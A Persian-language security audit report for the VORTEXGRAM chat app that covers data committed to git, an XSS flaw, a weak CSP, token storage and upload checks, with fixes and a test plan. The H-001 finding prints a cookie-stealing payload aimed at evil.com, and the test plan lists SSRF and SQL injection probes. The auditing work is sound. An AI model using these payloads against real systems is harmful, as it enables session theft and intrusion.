# 🔒 گزارش ممیزی امنیتی VORTEXGRAM

**تاریخ:** ۲۰۲۶/۰۹/۲۸
**ممیز:** Security Auditor (فقط‌خواندنی)
**وضعیت:** کد تغییر نکرده — فقط تحلیل و گزارش

---

## 📋 فهرست مطالب

1. [معماری](#معماری)
2. [سطح حمله](#سطح-حمله)
3. [یافته‌های بحرانی](#یافتههای-بحرانی)
4. [یافته‌های بالا](#یافتههای-بالا)
5. [یافته‌های متوسط](#یافتههای-متوسط)
6. [یافته‌های پایین](#یافتههای-پایین)
7. [احراز هویت](#احراز-هویت)
8. [مجوزها و دسترسی](#مجوزها-و-دسترسی)
9. [امنیت API](#امنیت-api)
10. [دیتابیس](#دیتابیس)
11. [XSS](#xss)
12. [CSRF](#csrf)
13. [آپلود فایل](#آپلود-فایل)
14. [WebSocket](#websocket)
15. [محدودیت نرخ](#محدودیت-نرخ)
16. [Secrets و پیکربندی](#secrets-و-پیکربندی)
17. [هدرهای امنیتی](#هدرهای-امنیتی)
18. [منطق کسب‌وکار](#منطق-کسبوکار)
19. [برنامه تست امنیتی](#برنامه-تست-امنیتی)
20. [ترتیب اصلاح پیشنهادی](#ترتیب-اصلاح-پیشنهادی)

---

## معماری

```
┌─────────────────────────────────────────────────────────┐
│                    کلاینت (Browser/App)                  │
│  public/app.js  │  public/index.html  │  public/sw.js   │
└──────────────────────┬──────────────────────────────────┘
                       │ HTTP / WebSocket
┌──────────────────────▼──────────────────────────────────┐
│              Node.js + Express 4.19.2                    │
│                   server.js (2368 خط)                   │
│  ┌─────────┐ ┌──────────┐ ┌────────┐ ┌───────────────┐ │
│  │  Auth   │ │  Routes  │ │  WS    │ │  Middleware   │ │
│  │sessions │ │  /api/*  │ │  ws    │ │  security     │ │
│  └─────────┘ └──────────┘ └────────┘ └───────────────┘ │
│  ┌──────────────────────────────────────────────────┐   │
│  │              db.js (Dual Backend)                │   │
│  │  PostgreSQL (parameterized) │ JSON File (fallback)│   │
│  └──────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────┘
```

**فناوری‌ها:**
- Node.js + Express 4.19.2
- WebSocket: `ws` 8.18.0
- آپلود: `multer` 2.0.1
- دیتابیس: PostgreSQL (parameterized queries) یا JSON file
- احراز هویت: Session-based (in-memory Map + persistent file/DB)
- کلاینت: Vanilla JS + Service Worker + Capacitor (iOS/Android)

---

## سطح حمله

| مسیر | دسترسی | توضیح |
|------|--------|-------|
| `/api/*` | عمومی/احرازشده | REST API — بیشتر مسیرها `auth` می‌خواهند |
| `/uploads/*` | احرازشده | فایل‌های آپلودی — فقط با نشست معتبر |
| `/img/*` | عمومی | تصاویر استاتیک (آواتار/پس‌زمینه) |
| `/app`, `/join/:token` | عمومی | صفحه‌های عمومی (لاگین) |
| WebSocket | احرازشده | با token در پیام `auth` اولیه |
| `data/db.json` | git-tracked | ⚠️ شامل داده‌های کاربران |
| `public/uploads/*` | git-tracked | ⚠️ فایل‌های آپلودی کاربران در تاریخچه git |

---

## یافته‌های بحرانی

### C-001: داده‌های کاربران در Git ردیابی می‌شوند

- **Severity:** CRITICAL
- **File:** `data/db.json`, `data/db.json.bak`, `data/db.json.migrated`
- **Root Cause:** فایل‌های دیتابیس JSON و فایل‌های آپلودی کاربران در مخزن git ردیابی می‌شوند. با وجود `.gitignore` که `data/*` را می‌بلعد، این فایل‌ها قبلاً commit شده‌اند و در تاریخچه git باقی مانده‌اند.
- **Evidence:**
  ```bash
  git ls-files data/ public/uploads/
  # data/db.json
  # data/db.json.bak
  # data/db.json.migrated
  # public/uploads/1787386724426-26f6de55a4.jpg
  # ... (30+ فایل)
  ```
- **Impact:** هر کسی به مخزن دسترسی داشته باشد (یا در صورت leak مخزن) می‌تواند شماره تلفن، هش رمز، پیام‌ها و فایل‌های آپلودی تمام کاربران را ببیند.
- **Recommended Fix:**
  1. فوراً `git rm --cached data/db.json data/db.json.bak data/db.json.migrated` و از آن‌ها در تاریخچه git با `git filter-repo` پاک‌سازی کنید
  2. `public/uploads/` را هم از تاریخچه پاک کنید
  3. `.gitignore` را بررسی کنید — مطمئن شوید `data/*` و `public/uploads/*` به‌درستی کار می‌کنند
  4. اگر مخزن private نیست، فوراً private کنید
- **Regression Test:** `git ls-files data/` و `git ls-files public/uploads/` باید خالی باشند

### C-002: فایل‌های آپلودی کاربران در Git

- **Severity:** CRITICAL
- **File:** `public/uploads/*` (30+ فایل ردیابی‌شده)
- **Root Cause:** مشابه C-001 — فایل‌های رسانه‌ای کاربران در مخزن git قرار دارند
- **Impact:** لو رفتن تصاویر، ویس‌ها و سایر فایل‌های خصوصی کاربران
- **Recommended Fix:** همانند C-001 — از تاریخچه git پاک‌سازی شوند

---

## یافته‌های بالا

### H-001: XSS از طریق `javascript:` URL در `formatText()`

- **Severity:** HIGH
- **File:** `public/app.js:1005-1016` (تابع `formatText`)
- **Root Cause:** تابع `formatText` ابتدا متن را با `esc()` escape می‌کند، اما سپس در regex لینک‌ها `[text](url)` را به `<a href="$2">` تبدیل می‌کند بدون اینکه پروتکل URL را بررسی کند. از آنجا که `esc()` کاراکترهای HTML را encode می‌کند اما `javascript:alert(1)` کاراکتر ویژه‌ای ندارد، این پروتکل در `href` باقی می‌ماند.
- **Evidence:**
  ```javascript
  // app.js:1012
  s = s.replace(/\[([^\]]+)\]\(([^)]+)\)/g, '<a href="$2" target="_blank" rel="noopener">$1</a>');
  ```
  کاربر می‌تواند پیام زیر را بفرستد:
  ```
  [کلیک کن](javascript:document.location='https://evil.com/?c='+document.cookie)
  ```
- **Impact:** اجرای کد جاوااسکریپت در زمینه قربانی — سرقت توکن نشست از localStorage، ارسال پیام به نام قربانی، دسترسی به تمام داده‌ها
- **Recommended Fix:**
  ```javascript
  s = s.replace(/\[([^\]]+)\]\(([^)]+)\)/g, (m, text, url) => {
    if (!/^(https?:\/\/|\/)/i.test(url)) return m; // فقط http(s) و مسیرهای داخلی
    return '<a href="' + url + '" target="_blank" rel="noopener">' + text + '</a>';
  });
  ```
- **Regression Test:** ارسال پیام با `[test](javascript:alert(1))` و بررسی اینکه `<a>` با `javascript:` ایجاد نشود

### H-002: `capacitor.config.json` — ناوبری نامحدود و Mixed Content

- **Severity:** HIGH
- **File:** `capacitor.config.json`
- **Evidence:**
  ```json
  {
    "server": {
      "url": "https://66ae722b68435c.lhr.life",
      "allowNavigation": ["*"]
    },
    "android": {
      "allowMixedContent": true
    }
  }
  ```
- **Root Cause:**
  - `allowNavigation: ["*"]` — اپ اجازه می‌دهد به هر URL خارجی ناوبری کند (حتی اگر XSS رخ دهد)
  - `allowMixedContent: true` — اجازه بارگذاری HTTP روی HTTPS (MITM)
  - URL سرور به‌صورت هاردکد در فایل قرار دارد
- **Impact:** در صورت XSS، مهاجم می‌تواند اپ را به هر سمت ببرد. Mixed Content اجازه حملات MITM می‌دهد.
- **Recommended Fix:**
  1. `allowNavigation` را به دامنه‌های مجاز محدود کنید
  2. `allowMixedContent` را روی `false` بگذارید
  3. URL سرور را از متغیر محیطی بخوانید

### H-003: CSP اجازه `'unsafe-inline'` برای اسکریپت‌ها

- **Severity:** HIGH
- **File:** `server.js:409`
- **Evidence:**
  ```javascript
  res.setHeader('Content-Security-Policy',
    "default-src 'self'; script-src 'self' 'unsafe-inline'; ...");
  ```
- **Root Cause:** `'unsafe-inline'` در `script-src` باعث می‌شود CSP در برابر XSS بی‌اثر باشد. هر `<script>` inline یا `onclick=""` اجرا می‌شود.
- **Impact:** حافظه اصلی در برابر XSS غیرفعال می‌شود. تمام تلاش‌های frontend برای escaping بی‌فایده می‌شوند.
- **Recommended Fix:**
  1. `'unsafe-inline'` را از `script-src` حذف کنید
  2. از nonce-based CSP استفاده کنید (هر درخواست nonce تصادفی بگیرد)
  3. اگر حذف ممکن نیست، حداقل `unsafe-eval` را هم اضافه نکنید
- **Regression Test:** بعد از تغییر، مرورگر باید `<script>alert(1)</script>` را inline بلاک کند

---

## یافته‌های متوسط

### M-001: SHA-256 fallback برای هش رمز عبور

- **Severity:** MEDIUM
- **File:** `server.js:273-275, 296`
- **Root Cause:** اگر `passHash` کاربر با `scrypt$` شروع نشود، از SHA-256 استفاده می‌کند (خط 296). SHA-256 سریع و قابل بروت‌فورس است.
- **Evidence:**
  ```javascript
  function hash(pw, salt) {
    return crypto.createHash('sha256').update(salt + ':' + pw).digest('hex');
  }
  // verifyPassword line 296:
  return user.passHash !== null && user.passHash === hash(p, user.salt);
  ```
- **Impact:** کاربران قدیمی که هنوز رمزشان مهاجرت نکرده است، در معرض بروت‌فورس قرار دارند
- **Recommended Fix:** کاربران قدیمی را مجبور کنید در اولین ورود رمز خود را تغییر دهند (یا در زمان ورود، هش را به scrypt تبدیل کنید)

### M-002: محدودیت نرخ فقط در حافظه (In-Memory)

- **Severity:** MEDIUM
- **File:** `server.js:128-148`
- **Root Cause:** تمام Mapهای rate-limit (`authAttempts`, `wsRateLimits`, `wsConnTimes`, `uploadUsage`) در حافظه پروسه قرار دارند. با ری‌استارت سرور یا در چند instance، ریست می‌شوند.
- **Impact:** مهاجم می‌تواند با ری‌استارت سرور یا استفاده از چند IP، rate-limit را دور بزند
- **Recommended Fix:** از Redis یا یک لایه مشترک برای rate-limit استفاده کنید

### M-003: توکن نشست در localStorage

- **Severity:** MEDIUM
- **File:** `public/app.js` (localStorage `ft_token`)
- **Root Cause:** توکن نشست در `localStorage` ذخیره می‌شود که از طریق XSS قابل سرقت است. با این حال، کوکی `ft_sess` دارای `HttpOnly` است.
- **Impact:** در صورت XSS، مهاجم می‌تواند `ft_token` را از localStorage بخواند و تمام حساب را تصاحب کند
- **Recommended Fix:**
  1. از `HttpOnly` cookie به‌جای localStorage برای توکن استفاده کنید (httponly از دسترسی JS جلوگیری می‌کند)
  2. یا حداقل توکن را در sessionStorage بگذارید (با بستن تب پاک می‌شود)

### M-004: آپلود فایل — اعتبارسنجی فقط بر اساس Extension

- **Severity:** MEDIUM
- **File:** `server.js:739-746, 1459-1469`
- **Root Cause:** `fileFilter` فقط MIME type را بر اساس هدر درخواست بررسی کند (که کلاینت می‌تواند جعل کند). هیچ اعتبارسنجی محتوای فایل (magic bytes) انجام نمی‌شود.
- **Evidence:**
  ```javascript
  fileFilter: (req, file, cb) => cb(null, ['image/jpeg', 'image/png', 'image/webp'].includes(cleanMime(file.mimetype))),
  ```
- **Impact:** مهاجم می‌تواند فایل `.jpg` با محتوای مخرب (مثل HTML/JS) آپلود کند. اگر کاربر دیگری آن را باز کند، XSS اجرا می‌شود
- **Recommended Fix:**
  1. magic bytes فایل را بررسی کنید (مثلاً `FF D8 FF` برای JPEG)
  2. فایل‌های تصویر را با sharp/jimp resize کنید (فرمت دوباره می‌شود)
  3. Content-Type را سرور-side تعیین کنید

### M-005: بدون CSRF Token

- **Severity:** MEDIUM
- **File:** `server.js` (هیچ CSRF protection یافت نشد)
- **Root Cause:** برخلاف `SameSite=Strict` که خوب است، هیچ CSRF token برای درخواست‌های تغییردهنده (POST/PATCH) وجود ندارد. `SameSite=Strict` از CSRF جلوگیری می‌کند اما برای اپ‌های native (Capacitor) که Origin نمی‌فرستند، این محافظت کار نمی‌کند.
- **Impact:** اپ native بدون Origin header — CSRF ممکن است
- **Recommended Fix:** برای مسیرهای حساس، یک CSRF token در header بررسی کنید

---

## یافته‌های پایین

### L-001: کد OTP در پاسخ API (حالت Dev)

- **Severity:** LOW (در production غیرفعال)
- **File:** `server.js:564`
- **Evidence:** `if (devCodeEnabled) out.devCode = code;`
- **Root Cause:** در حالت توسعه (بدون `VX_HIDE_CODE=1`)، کد OTP در پاسخ API برمی‌گردد
- **Impact:** اگر `VX_HIDE_CODE` در production ست نشود، کد ورود لو می‌رود
- **Recommended Fix:** مطمئن شوید `VX_HIDE_CODE=1` در production فعال است

### L-002: هیچ helmet استفاده نمی‌شود

- **Severity:** LOW
- **File:** `server.js`
- **Root Cause:** هدرهای امنیتی به‌صورت دستی تنظیم شده‌اند (که خوب است) اما `helmet` استفاده نمی‌شود
- **Impact:** اگر در آینده route جدیدی اضافه شود، ممکن است هدرها فراموش شوند
- **Recommended Fix:** از `helmet` استفاده کنید یا middleware هدرها را مرکزی نگه دارید

---

## احراز هویت

### نقاط قوت
- ✅ رمز عبور با **scrypt** هش می‌شود (N=16384, r=8, p=1) — استاندارد صنعت
- ✅ کوکی نشست: `HttpOnly; SameSite=Strict; Path=/; Max-Age=...` — خوب
- ✅ توکن نشست: `crypto.randomBytes(32).toString('hex')` — 256 bit تصادفی
- ✅ احراز هویت دو مرحله‌ای (OTP) با rate-limit
- ✅ Session sliding (هر فعالیت عمر نشست را جلو می‌برد)
- ✅ خروج از سمت سرور: توکن در Map حذف می‌شود (فقط Bearer token، نه cookie)

### نقاط ضعف
- ⚠️ SHA-256 fallback برای هش‌های قدیمی (M-001)
- ⚠️ توکن در localStorage (M-003)
- ⚠️ `authRateOk` فقط IP-based است — در  NAT ممکن است کاربران صدمنابعی تراز شوند

---

## مجوزها و دسترسی

### نقاط قوت
- ✅ `canAccess(roomId, username)` — بررسی عضویت در اتاق برای هر درخواست
- ✅ `canPost(roomId, username)` — بررسی حق ارسال
- ✅ `isOriginalAdmin()` — فقط ادمین اصلی (از `ADMIN_PHONES`) می‌تواند impersonate/promote/reset-password کند
- ✅ `canInteract()` — بررسی block/allowed قبل از تماس

### نقاط ضعف
- ⚠️ `canAccess` برای DM فقط بررسی می‌کند که username در roomId باشد — اگر کاربر A به B block شده باشد ولی roomId شامل هر دو باشد، دسترسی وجود دارد (خط 370: `otherUser.blocked.includes(username)` — این درست است)

---

## امنیت API

### نقاط قوت
- ✅ Parameterized queries در repositories (SQL injection ندارد)
- ✅ `express.json({ limit: '1mb' })` — محدودیت حجم body
- ✅ `wss.maxPayload = 512 * 1024` — محدودیت حجم WS
- ✅ Input validation برای username (`/^[a-zA-Z0-9_]{3,20}$/`)
- ✅ `MAX_MSG_LEN = 4000` — محدودیت طول پیام
- ✅ SSRF protection در link-preview (`isPrivateIp` check)

### نقاط ضعف
- ⚠️ `formatText()` — XSS از طریق `javascript:` URL (H-001)
- ⚠️ File upload بدون اعتبارسنجی محتوا (M-004)

---

## دیتابیس

### نقاط قوت
- ✅ Parameterized queries در `server/db/repositories.js` — SQL injection ندارد
- ✅ Transaction-based save (`BEGIN`/`COMMIT`/`ROLLBACK`)
- ✅ Dual backend (PostgreSQL + JSON file) با migration

### نقاط ضعف
- ⚠️ `data/db.json` در git ردیابی می‌شود (C-001)
- ⚠️ Session TTL 30 روز — طولانی است
- ⚠️ هیچ audit log برای عملیات ادمین وجود ندارد

---

## XSS

### نقاط قوت
- ✅ تابع `esc()` از `textContent`/`innerHTML` استفاده می‌کند — روش امن escaping
- ✅ اکثر رندرهای کاربر از `esc()` استفاده می‌کنند
- ✅ CSP وجود دارد (هرچند ضعیف)

### نقاط ضعف
- ❌ `formatText()` — `javascript:` URL (H-001)
- ❌ CSP با `'unsafe-inline'` (H-003)
- ⚠️ برخی `innerHTML` بدون `esc()` در موارد خاص (نیاز به بررسی دقیق‌تر)

---

## CSRF

- ✅ `SameSite=Strict` — محافظت خوب برای مرورگرها
- ⚠️ اپ native (Capacitor) بدون Origin — CSRF ممکن است (M-005)
- ⚠️ هیچ CSRF token وجود ندارد

---

## آپلود فایل

### نقاط قوت
- ✅ نام فایل تصادفی: `Date.now() + '-' + crypto.randomBytes(5).toString('hex')`
- ✅ محدودیت حجم: 30MB (عادی) / 100MB (پرمیوم)
- ✅ محدودیت تعداد: 60 فایل/ساعت، 400MB/ساعت
- ✅ `/uploads/*` فقط با auth سرو می‌شود
- ✅ `Cache-Control: private` — فایل‌ها در CDN کش نمی‌شوند

### نقاط ضعف
- ⚠️ اعتبارسنجی فقط بر اساس MIME type کلاینت (M-004)
- ⚠️ فایل‌های قدیمی در git (C-002)

---

## WebSocket

### نقاط قوت
- ✅ Origin check: `originAllowed()` — فقط همان هاست مجاز
- ✅ Rate limit اتصال: 8 اتصال/10 ثانیه/IP، حداکثر 12 اتصال همزمان
- ✅ Rate limit پیام: 30 پیام/10 ثانیه/کاربر
- ✅ Auth قبل از هر پیام: `getSession(data.token)`
- ✅ `maxPayload = 512KB`
- ✅ بررسی `canAccess` برای هر پیام history/message/read
- ✅ بررسی block در DM

### نقاط ضعف
- ⚠️ Rate-limit در حافظه (M-002)

---

## محدودیت نرخ

### نقاط قوت
- ✅ تمام مسیرهای حساس rate-limit دارند
- ✅ `clientIp()` فقط وقتی `TRUST_PROXY` فعال باشد XFF را می‌خواند (ضد spoofing)
- ✅ تست‌های security.test.js پوشش دارند

### نقاط ضعف
- ⚠️ In-memory — ری‌استارت = ریست (M-002)
- ⚠️ در چند instance کار نمی‌کند

---

## Secrets و پیکربندی

### نقاط قوت
- ✅ `.env` در `.gitignore` است
- ✅ `.env.example` بدون مقادیر واقعی
- ✅ `render.yaml` بدون secret
- ✅ `Dockerfile` بدون secret

### نقاط ضعف
- ❌ `data/db.json` در git (C-001)
- ❌ `public/uploads/*` در git (C-002)
- ⚠️ `capacitor.config.json` با URL هاردکد (H-002)

---

## هدرهای امنیتی

| هدر | وضعیت | مقدار |
|-----|--------|-------|
| `X-Content-Type-Options` | ✅ | `nosniff` |
| `X-Frame-Options` | ✅ | `DENY` |
| `Referrer-Policy` | ✅ | `no-referrer` |
| `X-XSS-Protection` | ✅ | `1; mode=block` |
| `Content-Security-Policy` | ⚠️ | `'unsafe-inline'` در script-src |
| `Strict-Transport-Security` | ✅ | `max-age=31536000; includeSubDomains` (فقط HTTPS) |
| `Cache-Control` | ✅ | مناسب برای هر مسیر |

---

## منطق کسب‌وکار

### نقاط قوت
- ✅ سیستم block دوطرفه در DM
- ✅ سیستم rate-limit آپلود (حجم + تعداد)
- ✅ سقف ساخت گروه (2 عادی / 10 پرمیوم)
- ✅ سیستم rename request (تایید ادمین)
- ✅ سیستم report

### نقاط ضعف
- ⚠️ هیچ audit log برای عملیات ادمین (impersonate, ban, reset-password)
- ⚠️ هیچ محدودیتی برای تعداد گروه‌های public وجود ندارد

---

## برنامه تست امنیتی

| # | تست | روش | اولویت |
|---|------|------|--------|
| 1 | XSS از طریق `javascript:` URL در پیام | ارسال `[x](javascript:alert(1))` و کلیک | HIGH |
| 2 | CSRF از طریق فرم خارجی | ایجاد HTML با POST به `/api/block` | MEDIUM |
| 3 | IDOR — دسترسی به پیام کاربر دیگر | تغییر roomId در WS `history` | HIGH |
| 4 | بروت‌فورس OTP | ارسال 10 کد اشتباه | MEDIUM |
| 5 | آپلود فایل مخرب | آپلود `.jpg` با محتوای HTML | HIGH |
| 6 | SSRF در link-preview | ارسال `url=http://169.254.169.254/` | MEDIUM |
| 7 | Session fixation | استفاده از توکن قدیمی بعد از logout | MEDIUM |
| 8 | Rate-limit bypass | ارسال 100 درخواست/ثانیه | LOW |
| 9 | SQL injection | ارسال `' OR 1=1--` در username | LOW |
| 10 | بررسی git history | `git log --all -- data/db.json` | HIGH |

---

## ترتیب اصلاح پیشنهادی

| اولویت | یافته | زمان تخمینی | توضیح |
|--------|--------|-------------|-------|
| 🔴 P0 | C-001, C-002 | ۱ ساعت | پاک‌سازی داده‌ها از git history |
| 🔴 P0 | H-001 | ۳۰ دقیقه | فیلتر `javascript:` در formatText |
| 🟠 P1 | H-002 | ۱ ساعت | اصلاح capacitor.config.json |
| 🟠 P1 | H-003 | ۲ ساعت | حذف `'unsafe-inline'` از CSP |
| 🟡 P2 | M-001 | ۱ ساعت | مهاجرت هش‌های SHA-256 به scrypt |
| 🟡 P2 | M-002 | ۴ ساعت | Redis برای rate-limit |
| 🟡 P2 | M-003 | ۲ ساعت | انتقال توکن به HttpOnly cookie |
| 🟡 P2 | M-004 | ۲ ساعت | اعتبارسنجی magic bytes فایل |
| 🟢 P3 | M-005 | ۲ ساعت | افزودن CSRF token |
| 🟢 P3 | L-001 | ۱۵ دقیقه | بررسی VX_HIDE_CODE در production |
| 🟢 P3 | L-002 | ۱ ساعت | افزودن helmet |

---

## خلاصه اجمالی

| سطح | تعداد | موارد |
|------|--------|-------|
| CRITICAL | 2 | داده‌های کاربران در git |
| HIGH | 3 | XSS در formatText، capacitor config، CSP ضعیف |
| MEDIUM | 5 | SHA-256 fallback، rate-limit حافظه‌ای، localStorage token، آپلود بدون اعتبارسنجی محتوا، CSRF |
| LOW | 2 | OTP در پاسخ، بدون helmet |

**امتیاز کلی امنیت:** ۶.۵/۱0

**توصیه:** اولویت اصلی پاک‌سازی داده‌ها از تاریخچه git و فیلتر XSS در `formatText` است. این دو مورد بیشترین تأثیر را دارند.

---

*این گزارش فقط‌خواندنی است — هیچ تغییری در کد اعمال نشده.*
